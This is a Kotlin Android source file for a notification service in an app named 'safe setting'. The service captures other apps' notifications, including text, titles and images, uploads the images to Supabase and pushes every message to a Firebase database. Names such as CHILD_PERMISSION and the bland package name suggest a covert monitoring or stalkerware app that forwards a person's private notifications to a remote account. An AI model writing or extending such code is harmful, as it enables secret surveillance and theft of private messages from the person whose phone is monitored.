package com.safe.setting.app.services.notificationService

import android.content.Context
import dagger.hilt.android.qualifiers.ApplicationContext
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.safe.setting.app.data.model.NotificationMessages
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.utils.ConstFun.getDateTime
import com.safe.setting.app.utils.Consts
import com.safe.setting.app.utils.Consts.CHILD_PERMISSION
import com.safe.setting.app.utils.Consts.DATA
import com.safe.setting.app.utils.Consts.NOTIFICATION_MESSAGE
import com.safe.setting.app.utils.FileHelper
import com.safe.setting.app.utils.FileHelper.getFileNameBitmap
import com.safe.setting.app.utils.supabase.SupabaseManager
 
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.retryWhen
import kotlinx.coroutines.flow.catch
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.onEach
import kotlinx.coroutines.flow.launchIn
import kotlinx.coroutines.flow.distinctUntilChanged
 
import kotlinx.coroutines.Dispatchers
import java.io.File
import javax.inject.Inject

class InteractorNotificationService @Inject constructor(@ApplicationContext private val context: Context, private val firebase: InterfaceFirebase) : InterfaceNotificationListener {

    // Removed CompositeDisposable; using coroutines

    override fun setRunService(run: Boolean) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference("$NOTIFICATION_MESSAGE/$CHILD_PERMISSION").setValue(run)
    }

    override fun getNotificationExists(id: String, exec: () -> Unit) {
        if (firebase.getUser()!=null) {
            val scope = CoroutineScope(Dispatchers.Main)
            val job: Job = scope.launch {
                flow {
                    val snapshot = withContext(Dispatchers.IO) {
                        firebase.queryValueEventSingle("$NOTIFICATION_MESSAGE/$DATA","nameImage",id)
                    }
                    emit(snapshot.exists())
                }
                    .retryWhen { cause, attempt ->
                        val baseDelayMs = 500L
                        val multiplier = 2.0
                        val maxDelayMs = 10_000L
                        val jitterPct = 0.2
                        if (attempt < 3) {
                            val computed = (baseDelayMs * Math.pow(multiplier, attempt.toDouble())).toLong()
                            val delay = kotlin.math.min(maxDelayMs, computed)
                            val jitter = (delay * jitterPct).toLong()
                            val jittered = delay + (-jitter..jitter).random()
                            kotlinx.coroutines.delay(kotlin.math.max(0L, jittered))
                            true
                        } else false
                    }
                    .catch { e -> Log.e(Consts.TAG, e.message.toString()) }
                    .collect { exists -> if (!exists) exec() }
            }
            // Disposable bridge removed; use job reference if needed
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun setDataMessageNotification(type: Int, text: String?, title: String?, nameImage: String?, image:Bitmap?) {
        if (image!=null && nameImage != null){
            val imageFilePath = image.getFileNameBitmap(context,nameImage)
            val imageFile = File(imageFilePath)

            // ===============================================================
            // बदला हुआ कोड
            // लॉजिक: CloudinaryManager को SupabaseManager से बदल दिया गया है।
            // अब नोटिफिकेशन की इमेज भी Supabase पर अपलोड होगी।
            // ===============================================================
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val url = SupabaseManager.uploadFile(imageFile)
                    // कोरूटीन से मेन थ्रेड पर स्विच करने की आवश्यकता नहीं है क्योंकि setData फायरबेस में लिखता है
                    // जो पहले से ही बैकग्राउंड थ्रेड को हैंडल करता है।
                    setData(type, text, title, nameImage, url)
                } catch (e: Exception) {
                    Log.e(Consts.TAG, "Supabase Upload Error: ${e.message}")
                    // विफल होने पर भी हम डेटा सहेजते हैं, लेकिन बिना URL के।
                    setData(type, text, title, nameImage, null)
                } finally {
                    FileHelper.deleteFile(imageFilePath)
                }
            }

        } else {
            setData(type,text,title,"-",null)
        }
    }

    private fun setData(type: Int, text: String?, title: String?,nameImage:String?,urlImage:String?){
        val message = NotificationMessages(text,title,type,getDateTime(),nameImage,urlImage)
        firebase.getDatabaseReference("$NOTIFICATION_MESSAGE/$DATA").push().setValue(message)
    }
}
